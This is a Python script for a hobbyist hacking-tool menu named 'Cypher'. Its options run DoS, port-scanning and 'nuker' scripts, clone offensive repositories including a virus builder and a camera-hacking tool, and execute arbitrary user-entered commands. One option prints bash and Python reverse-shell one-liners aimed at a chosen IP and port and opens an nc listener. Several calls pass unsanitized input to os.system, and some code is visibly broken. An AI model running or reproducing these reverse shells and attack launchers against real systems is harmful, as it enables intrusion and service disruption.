import os
import socket 
import time
import sys
import pyfiglet
import webbrowser
from credits import *
import praw
from menus import *
from banner import *
from settings import *
from colorama import Fore, Back, Style
from main import *
def cls():
  os.system('clear')


print(Fore.WHITE +"")
if Loader =='True':  
  for i in range(12):
    cls()
    print("Loading Cypher..........................")
if Loader =='False':
  print("")
else:
  print(Fore.RED + "Invalid argument in settings.py!")
  sys.exit()
cls()
if Banner =="True":
  print(banner2)
elif Banner =="False":
  print("")
elif AsciiText =='True':
  ascii_banner = pyfiglet.figlet_format("Cypher")
  print(ascii_banner)


print(t)
while True:
  u = input("")
  if u =='1':
    os.system('python3 dos.py')
  elif u =='2':
    e = input("Enter command: ")
    os.system("{}".format(e))
  elif u =='3':
    print("If your have a ssh ip already saved in (settings.py) hit 'f or e'")
    z = input("hit enter if you dont have a ip saved.")
    if z =='f' or 'e':
      print(ssh)
    w = input("Enter: username,@ and port")
    print("THANK YOU FOR USING CYPHER!")
    os.system('ssh {}'.format(w))
  elif u =='4':
    os.system('python3 portscan.py')
  elif u =='5':
    os.system('python3 portscan.py')
  elif u =='6':
    sys.exit()
  elif u =='7':
    cls()
    print(t)
  elif u =='8':
    os.system('python3 restart.py')
  elif u =='9':
    os.system('python3 password-checker.py')
  elif u =='10':
    print("NOT YET")
  elif u =='pynxisthegoat':
    print("https://www.youtube.com/watch?v=iik25wqIuFo")
  elif u =='11':
    webbrowser.open('http://google.co.kr', new=2)
  elif u =='12':
    whois = input("Enter Url Or IP: ")
    url = 'https://whois.domaintools.com/'
    webbrowser.open(url+whois, new=2)
  elif u =='13':
    print("NOT FINISHED")
  elif u =='14':
    webbrowser.open('http://youtube.com/PynxTheGoat', new=2)
  elif u =='15':
    webbrowser.open('https://www.twitch.tv/pynxthegoat', new=2)
  elif u =='16':
    print("NOT YET")
  elif u =='17':
    print("inorder to run raven-software you agree to their terms and please hit enter to install")
    input("")
  elif u =='18':
    print("NOT YET")
  elif u =='19':
    print("NOT YET")
  elif u =='20':
    webbrowser.open('http://pynxtech.tk/')
  elif u =='21':
    nmap = input("Enter ip or domain")
    os.system('nmap {}'.format(nmap))
  elif u =='22':
    port = input("Enter port: ")
    ip = input("Enter ip for connector: ")
    print("Bash: ")
    print("bash -i >& /dev/tcp/{}/{} 0>&1".format(ip,port))
    print("Python3: ")
    print('''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"'''.format(ip,port))
    os.system('nc -lnvp {}'.format(port))
  elif u =='23':
    os.system('git clone https://github.com/Cyber-Dioxide/Virus-Builder')
    print("Done installing!")
  elif u =='24':
    id = input("Enter client-id: ")
    secrect = input("Enter client-secret: ")
    agent = input("Enter user_agent: ")
    #https://www.reddit.com/prefs/apps to get key shit
    reddit_read_only = praw.Reddit(client_id="{}", client_secret="{}", user_agent="{}".format(id,secret,agent))
    subreddit = reddit_read_only.subreddit("teenagers")
    print("Subreddit: ", subreddit.title, "\n")
    try:
      while True:
        time.sleep(delay)
        os.system("clear")
        for post in subreddit.new(limit=7):
          print("post title:", post.title)
          if post.selftext == "":
            post.selftext = "none"
            print("post text:", post.selftext)
            print("-" * 30)
    except KeyboardInterrupt:
      print(" caught... exiting")
      sys.exit()
  elif u =='25':
    os.system('git clone https://github.com/EntySec/Ghost')
  elif u =='26':
    os.system('git clone https://github.com/AngelSecurityTeam/Cam-Hackers')
  elif u =='27':
    os.system('python3 twitterscraper.py')
  elif u =='28':
    os.system('python3 nuker.py')
  elif u =='29':
    print("Not yet")
  elif u =='30':
    print("Not yet")
  elif u =='xx':
    cls()
    if Banner =="True":
      print(banner5)
      print(tttt)
  elif u =='x':
    cls()
    if Banner =="True":
      print(banner4)
    time.sleep(delay)
    print(ttt)
  elif u =='+':
    cls()
    if Banner =="True":
      print(banner3)
      print("")
    time.sleep(delay)
    print(tt)
  elif u =='-':
    cls()
    ascii_banner = pyfiglet.figlet_format("Cypher")
    print(ascii_banner)
    time.sleep(delay)
    print(t)
  elif u =='credits':
    credits()
  elif u =='?':
    print("""The reason i made this time consuming tool its because i was bored in class pretty much and i wanted something to pass the time because my grades wont count this year pahah :/ """)
  else:
    print("invalid!")
